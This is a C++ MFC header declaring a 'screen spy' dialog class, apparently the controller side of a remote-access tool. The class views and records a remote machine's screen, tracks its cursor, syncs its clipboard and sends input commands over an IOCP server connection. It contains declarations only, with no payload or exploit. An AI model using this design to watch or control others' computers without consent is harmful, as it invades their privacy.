#pragma once
#include"../../common/CursorInfo.h"
#include"BmpToAvi.h"
#include"../../libjpeg/jpeglib.h"
#include"IOCPServer.h"

#pragma comment(lib, "../../libjpeg/turbojpeg-static.lib")


class CScreenSpyDlg : public CDialog
{
	DECLARE_DYNAMIC(CScreenSpyDlg)

public:
	CScreenSpyDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext* pContext = NULL);   // 标准构造函数
	void OnReceiveComplete();
	void OnReceive();
	virtual ~CScreenSpyDlg();

	// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SCREENSPY };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()

private:
	HICON	m_hIcon;
	HANDLE m_hDynamicIcon;
	RECT	m_rcRestore;
	BOOL	m_bWinArrange;
	BOOL	m_bSnapSizing;
	HDC		m_hCurrWndDC;
	HDC		m_hLastMemDC;
	HBITMAP	m_hLastBitmap;
	LPVOID	m_lpvLastBits;
	LPVOID	m_lpvRectBits;
	LPBITMAPINFO m_lpbmi_full;
	LPBITMAPINFO m_lpbmi_rect;
	//CRITICAL_SECTION m_cs;
	CString m_aviFile; // 如果文件名不为空就写入
	CBmpToAvi	m_aviStream;
	//CXvidDec m_XvidDec;
	WINDOWPLACEMENT m_struOldWndpl;
	//HANDLE	m_hThreadFPS;
	UINT	m_nFramesCount;
	UINT	m_nFramesPerSecond;
	HCURSOR	m_hRemoteCursor;
	POINT	m_LastCursorPos;
	BYTE	m_LastCursorIndex;
	BOOL m_bFullScreen;
	UINT m_nCount;
	CCursorInfo	m_CursorInfo;
	void DrawTipString(CString str);
	void DrawFirstScreen();
	void EnterFullScreen();
	bool LeaveFullScreen();
	void DrawNextScreenHome();	// 家用办公算法
	bool JPG_BMP(int cbit, void* input, int inlen, void* output);
	void DrawNextScreenXvid();	// 影视娱乐算法
	void SendResetScreen(int nBitCount);
	void SendResetAlgorithm(UINT nAlgorithm);
	void FullScreen();
	void ResetScreen();
	void SaveAvi();
	bool SaveSnapshot();
	void UpdateLocalClipboard(char* buf, int len);
	void SendLocalClipboard();
	bool m_bIsFirst;
	bool m_bIsFullScreen;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsCtrl;
	void SendNext();
	void SendCommand(MSG* pMsg);
	//static DWORD WINAPI ShowFPSThread(LPVOID lpParam);
public:
	UINT	m_nWidth;
	UINT	m_nHeight;
public:
	afx_msg void OnGetMinMaxInfo(MINMAXINFO* lpMMI);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg void OnSizing(UINT fwSide, LPRECT pRect);
	afx_msg void OnNcLButtonDblClk(UINT nHitTest, CPoint point);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnMoving(UINT fwSide, LPRECT pRect);
	afx_msg void OnMove(int x, int y);
	virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
	virtual void PostNcDestroy();
};
